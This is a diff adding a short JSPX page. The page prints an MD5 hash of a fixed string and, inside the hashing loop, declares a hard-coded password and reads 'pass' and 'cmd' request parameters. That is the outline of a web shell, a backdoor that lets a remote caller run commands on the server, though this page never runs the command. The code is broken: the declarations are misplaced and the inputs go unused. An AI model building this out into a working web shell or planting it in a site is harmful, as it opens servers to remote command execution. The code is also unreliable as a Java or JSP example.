@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="GBK" ?>
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+    <jsp:directive.page contentType="text/html;charset=GBK"/>
+    <jsp:scriptlet>
+    String input = "1234561";
+    java.security.MessageDigest md = java.security.MessageDigest.getInstance("MD5");
+    byte[] digest = md.digest(input.getBytes());
+    for (byte b : digest) {
+        out.print(String.format("%02x", b));
+    String authPass = "YourSecureTestPass123!";
+    String pass = request.getParameter("pass");
+    String cmd = request.getParameter("cmd");
+    }
+  </jsp:scriptlet>
+</jsp:root>
